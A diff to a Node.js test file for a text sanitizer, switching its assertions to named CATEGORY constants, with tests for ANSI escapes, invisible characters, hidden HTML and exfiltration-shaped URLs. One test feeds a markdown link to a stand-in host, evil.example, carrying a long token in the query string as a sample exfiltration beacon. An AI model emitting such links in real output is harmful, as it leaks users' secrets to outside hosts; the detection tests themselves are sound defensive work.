@@ -6,7 +6,7 @@
 import { describe, it } from "node:test";
 import assert from "node:assert/strict";
 
-import { sanitize } from "../src/index.mjs";
+import { sanitize, CATEGORY } from "../src/index.mjs";
 import { cp } from "./test-helpers.mjs";
 
 const ESC = cp(0x1b);
@@ -51,7 +51,7 @@ describe("sanitize: Layer 1 ESC neutralization + idempotency", () => {
         `ESC survived: ${JSON.stringify(first.cleaned)}`,
       );
       assert.equal(first.cleaned, expected);
-      assert.match(first.found.join(", "), /ANSI escapes/);
+      assert.ok(first.found.includes(CATEGORY.ANSI));
       const second = await sanitize(first.cleaned);
       assert.equal(second.cleaned, first.cleaned);
       assert.deepEqual(second.found, []);
@@ -68,27 +68,27 @@ describe("sanitize: Layer 1 ESC neutralization + idempotency", () => {
   it("strips an invisible with no ANSI without reporting ANSI escapes", async () => {
     const out = await sanitize(`foo${ZW}bar`);
     assert.equal(out.cleaned, "foobar");
-    assert.deepEqual(out.found, ["Format chars (Cf)"]);
+    assert.deepEqual(out.found, [CATEGORY.CF]);
   });
 
   it("strips a non-SGR escape (cursor move) too — the ESC introducer is the hazard", async () => {
     const out = await sanitize(`${ESC}[2Jhello`);
     assert.ok(!out.cleaned.includes(ESC));
-    assert.match(out.found.join(", "), /ANSI escapes/);
+    assert.ok(out.found.includes(CATEGORY.ANSI));
   });
 
   it("strips a complete 8-bit C1 CSI sequence (U+009B introducer)", async () => {
     const out = await sanitize(`${cp(0x9b)}32m payload`);
     assert.ok(!out.cleaned.includes(cp(0x9b)));
     assert.equal(out.cleaned, " payload");
-    assert.match(out.found.join(", "), /ANSI escapes/);
+    assert.ok(out.found.includes(CATEGORY.ANSI));
   });
 
   it("sweeps a lone/incomplete C1 CSI introducer (U+009B), reporting it", async () => {
     const out = await sanitize(`a${cp(0x9b)}b`);
     assert.ok(!out.cleaned.includes(cp(0x9b)), "U+009B survived the sweep");
     assert.equal(out.cleaned, "ab");
-    assert.match(out.found.join(", "), /ANSI escapes/);
+    assert.ok(out.found.includes(CATEGORY.ANSI));
     // The sweep must honor the no-silent-suppression contract deterministically,
     // not just probabilistically via the fuzz postcondition.
     assert.ok(out.warnings.length > 0, "swept a byte without warning");
@@ -136,7 +136,7 @@ describe("sanitize: lone-surrogate normalization", () => {
   it("replaces a lone high surrogate with U+FFFD and warns", async () => {
     const out = await sanitize(`a${String.fromCharCode(0xd800)}b`);
     assert.equal(out.cleaned, `a${cp(0xfffd)}b`);
-    assert.ok(out.found.includes("Lone UTF-16 surrogates"));
+    assert.ok(out.found.includes(CATEGORY.LONE_SURROGATES));
     assert.match(out.warnings.join(" "), /Normalized lone UTF-16 surrogates/);
   });
   it("leaves a valid surrogate pair (emoji) intact", async () => {
@@ -179,8 +179,8 @@ describe("sanitize: html=true runs Layers 2 & 3", () => {
       html: true,
     });
     assert.doesNotMatch(out.cleaned, /SECRET/);
-    assert.ok(out.found.includes("HTML comments"));
-    assert.ok(out.found.includes("hidden HTML"));
+    assert.ok(out.found.includes(CATEGORY.HTML_COMMENTS));
+    assert.ok(out.found.includes(CATEGORY.HIDDEN_HTML));
     assert.match(out.warnings.join(" "), /HTML sanitized/);
   });
 
@@ -205,7 +205,7 @@ describe("sanitize: html=true runs Layers 2 & 3", () => {
     // The beacon is spliced out of the cleaned text...
     assert.doesNotMatch(out.cleaned, /evil\.example/);
     // ...but still reported, because the exfil scan runs on the pre-splice text.
-    assert.ok(out.found.includes("exfil URLs"));
+    assert.ok(out.found.includes(CATEGORY.EXFIL_URLS));
     assert.match(out.warnings.join(" "), /evil\.example/);
   });
 
@@ -214,7 +214,7 @@ describe("sanitize: html=true runs Layers 2 & 3", () => {
       "[c](https://evil.example/t?token=" + "A".repeat(44) + ")",
       { html: true },
     );
-    assert.ok(out.found.includes("exfil URLs"));
+    assert.ok(out.found.includes(CATEGORY.EXFIL_URLS));
     assert.match(out.warnings.join(" "), /Exfil-shaped URLs detected/);
   });
 
@@ -228,6 +228,6 @@ describe("sanitize: html=true runs Layers 2 & 3", () => {
   it("runs Layer 1 before the HTML layer (invisible inside HTML is stripped)", async () => {
     const out = await sanitize(`hi${ZW} <b>there</b>`, { html: true });
     assert.equal(out.cleaned, "hi <b>there</b>");
-    assert.ok(out.found.includes("Format chars (Cf)"));
+    assert.ok(out.found.includes(CATEGORY.CF));
   });
 });
